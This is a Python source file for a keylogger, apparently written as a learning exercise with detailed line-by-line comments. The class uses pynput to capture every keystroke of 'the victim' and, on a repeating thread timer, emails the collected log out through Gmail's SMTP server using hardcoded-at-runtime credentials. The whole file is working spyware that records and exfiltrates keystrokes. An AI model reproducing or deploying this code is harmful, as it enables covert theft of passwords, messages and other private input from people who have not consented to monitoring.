#!/usr/bin/env python

import pynput.keyboard         #pynput library allows to monitor and send keyboards, mouse strikes.
import threading               #library to run parallel process without disturbing the main branch.
import smtplib

#log=''                          #global variable

class Keylogger:
    def __init__(self, time_interval, email, password):             #constructor is executed automatically when ever an object is created. no need to call the "start" function explicitly.
                                                                     #every time an object is created for the class Keylogger all the arguments needs to be passed.
        self.log = "keylogger started"                              #global variable can be declared within constructor
        self.time_interval = time_interval                           #invoking time interval form the user instead of hard coding within this library.
        self.email = email
        self.password = password
    def append_log(self,string):                    #function to append the keys entered to log variable. for each character this function is called and it appends the character.
        self.log=self.log+string                    #string contains the value of the key that is entered by the victim.

    def process_keypress(self,key):
       # global log                  #letting the function know that log is global variable
                                     #no need for this because the log is declared within constructor
        try:
            current_key=str(key.char)           #to neglect the use of "u" before every key strike.
        except AttributeError:
            if key == key.space:
                current_key=" "
            else:
                current_key=" " +str(key) + " "
        self.append_log(current_key)

    def report(self):
      #  global log
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log=""
        timer= threading.Timer(self.time_interval,self.report)              #setting the threading process with the time interval. this runs parallely but only gets executed(call the report function(recursion)) after the time interval.
        timer.start()                                                       #To trigger the timer so that all of the above comment takes place.

    def send_mail(self,email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # instance of object SMTP is saved in server. gmail smtp server. on port 587.
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)  # (from,to, message)
        server.quit()

    def start(self):
        keyboard_listener= pynput.keyboard.Listener(on_press=self.process_keypress)           #variable to store the instance of the listener object.
                                                                         #listener listens for the keystroke. and on_press the functon will be executed
        with keyboard_listener:                                          #with keyword is used to interact with unmanaged streams of data.like file etc.
            self.report()                                                  #on first execution is going to send an email with the hardcoded char that is assigned in the constructor.
            keyboard_listener.join()                                     #join fuction starts the keyboard listener.(originally starting to monitor keyboard activity)